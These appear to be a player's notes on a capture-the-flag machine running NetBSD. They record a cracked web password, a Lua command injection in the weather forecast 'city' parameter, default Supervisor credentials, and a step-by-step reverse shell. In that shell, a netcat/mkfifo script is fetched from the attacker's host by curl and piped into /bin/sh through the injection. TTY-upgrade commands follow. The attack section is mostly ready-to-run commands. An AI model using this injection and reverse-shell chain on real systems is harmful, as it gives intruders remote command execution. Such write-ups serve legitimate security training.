# OS
	- NetBSD

# Credential
	- r.michaels / ??
	- webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0 (md5 encrypt, decrypt as iamthebest) 

# Website
	80: Webpage
		/
			- Need user/pass to authorized
			-	Indicate there's sth. run on port 3000
			=> webapi_user / iamthebest can login
		/robots.txt
			- there's /weather webpage.
		/weather ( Returning 404 but still harvesting cities )
			- /forcast
				- `/?city=<>` to specify cities
					- ' can cause error 500
					- '..'London can get normal execute
					- ');print('abc') can get print('abc') return 'abc', which means LUA COMMNAD INJECTION 
					- ');os.execute('id');-- Can get SHELL COMAND EXECUTION
						- Use + for space
						- Has curl
					- ls -al; cat .htpasswd find a user credencial webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
			
	9001: Medusa/1.12 (Supervisor process manager)
		/
			- Need user/pass to authorized
				- user/123
				=> Found the [default passowrd by Goolge](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/)
		- Supervisor 4.2.0	
		- processes webpage
			- httpd running /weather on 127.0.0.1:3000
			- httpd running /weather on 127.0.0.1:3001, differnet lua script behid
			- A user called r.michaels
	
# Reverse Shell
1. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 13338 >/tmp/f" > ./rev.sh
2. python3 -m http.server
3. nc -lnvp 13338
4. curl "curl+http://10.10.10.218/weather/forecast/?city=');os.execute('curl+http://10.10.14.20:8000/rev.sh|/bin/sh');--"
5. Get shell at nc
## tty shell
1. pythno3.8 -c 'import pty;pty.spawn("/bin/sh")'
2. 
3. stty raw -echo
4. fg
5. <Enter><Enter>


# TODO
1.(X) Check :80/weather
2.(X) Check :3000, :3000/weather
3.(X) Check :3001, :3001/weather
4. Fuzz :80/weather

